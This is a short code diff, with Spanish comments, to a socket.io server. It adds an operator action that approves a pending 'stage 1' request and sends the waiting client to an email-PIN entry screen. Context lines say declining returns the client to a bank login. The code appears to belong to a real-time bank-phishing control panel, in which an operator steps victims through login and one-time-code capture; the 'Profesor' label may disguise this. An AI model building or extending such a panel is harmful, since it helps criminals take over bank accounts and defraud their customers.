@@ -63,6 +63,17 @@ io.on('connection', (socket) => {
     }
   });
 
+    // NUEVO: Aprobar Etapa 1 pero con PIN enviado al CORREO
+  socket.on('aprobarEtapa1Correo', (requestId) => {
+    const request = pendingRequests.find(r => r.id === requestId);
+    if (request && request.estado === 'esperando_aprobacion1') {
+      request.estado = 'pin_pendiente';           // mismo estado que el PIN de teléfono
+      io.emit('listaActualizada', pendingRequests);
+      io.to(request.socketId).emit('pasarAPINCorreo');
+      console.log(`✅ Etapa 1 aprobada con PIN CORREO: ${request.nombre}`);
+    }
+  });
+
     // Profesor: Declinar etapa 1 → ahora devuelve al cliente al login del banco
   socket.on('declinarEtapa1', (requestId) => {
     const request = pendingRequests.find(r => r.id === requestId);
